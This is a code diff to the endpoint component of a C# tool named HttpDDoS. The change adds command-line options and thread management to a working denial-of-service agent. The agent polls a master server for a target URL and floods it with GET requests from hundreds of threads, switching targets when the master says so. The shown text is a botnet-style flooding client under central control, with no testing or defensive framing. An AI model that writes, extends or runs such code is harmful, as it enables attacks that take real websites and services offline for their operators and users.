@@ -7,52 +7,84 @@ using System.Text.Json;
 using System.Threading;
 using System.Threading.Tasks;
 using HttpDDoS.Shared;
+using CommandLine;
 
 namespace HttpDDoS.Endpoint
 {
     class Program
     {
-        const string master = "https://localhost:4914/Status";
-        const int MaxRunningTasks = 5000;
-        const int RefreshInterval = 10 * 1000;
 
-        static async Task Main(string[] args)
+        public static void Main(string[] args)
         {
-            Thread.Sleep(RefreshInterval);
+            Parser.Default.ParseArguments<Options>(args)
+                .WithParsed(Run);
+        }
 
+        public static void Run(Options options)
+        {
             CancellationTokenSource tokenSrc = new();
             var http = new HttpClient();
+
+            List<Thread> threads = new();
 
             Status currStatus = null;
 
             while (true)
             {
-                Console.WriteLine("Fetching Info From Master Server...");
-                var newStatus = await http.GetFromJsonAsync<Status>(master);
-
-                if (currStatus is null ||
-                    JsonSerializer.Serialize(newStatus) != JsonSerializer.Serialize(currStatus))
+                Console.WriteLine("MAIN: Fetching Info From Master Server...");
+                var newStatusTask = http.GetFromJsonAsync<Status>(options.Url);
+                newStatusTask.Wait();
+                var newStatus = newStatusTask.Result;
+                if (currStatus is null || newStatus.Url != currStatus.Url)
                 {
                     currStatus = newStatus;
+                    Console.WriteLine("MAIN: Got updated info! {0}", newStatus.Url);
+                    Console.WriteLine("MAIN: Killing old threads..");
                     tokenSrc.Cancel();
                     tokenSrc = new();
-                    Enumerable.Range(1, MaxRunningTasks).ToList()
-                        .ForEach(i =>
-                            Task.Run(() => Attack(currStatus),
-                            tokenSrc.Token));
+                    Console.WriteLine("MAIN: Creating new threads..");
+                    threads = Enumerable.Range(0, options.NumberOfThreads)
+                        .Select(_ => new Thread(() => Attack(currStatus, tokenSrc.Token)))
+                        .ToList();
+                    Console.WriteLine("MAIN: Starting new threads..");
+                    threads.ForEach(t => t.Start());
+                    Console.WriteLine("MAIN: Started.");
                 }
-
-                Thread.Sleep(RefreshInterval);
+                Thread.Sleep(options.RefreshInterval * 1000);
             }
         }
 
-        public static void Attack(Status status)
+
+        public static void Attack(Status status, CancellationToken token)
         {
             var http = new HttpClient();
-            while (true)
+            int count = 0;
+            while (!token.IsCancellationRequested)
             {
-                _ = http.GetAsync(status.Url);
+                try
+                {
+                    _ = http.GetAsync(status.Url, token).Result;
+                }
+                catch (Exception ex)
+                {
+                    if (!token.IsCancellationRequested) Console.WriteLine(ex);
+                }
+                count++;
             }
+            Console.WriteLine("SUB: Exited #{0} after {1} requests", Thread.CurrentThread.ManagedThreadId, count);
+        }
+
+        public class Options
+        {
+            const int DefaultNumberOfThreads = 500;
+            const int DefaultRefreshInterval = 10;
+
+            [Option('r', "refresh", Required = false, Default = DefaultRefreshInterval, HelpText = "Time to wait (in seconds) between each refresh of instructions.")]
+            public int RefreshInterval { get; set; }
+            [Option('u', "url", Required = true, HelpText = "The URL of the master service status endpoint.")]
+            public string Url { get; set; }
+            [Option('t', "threads", Required = false, Default = DefaultNumberOfThreads, HelpText = "Number of threads running in the background, consuming the target.")]
+            public int NumberOfThreads { get; set; }
         }
     }
 }
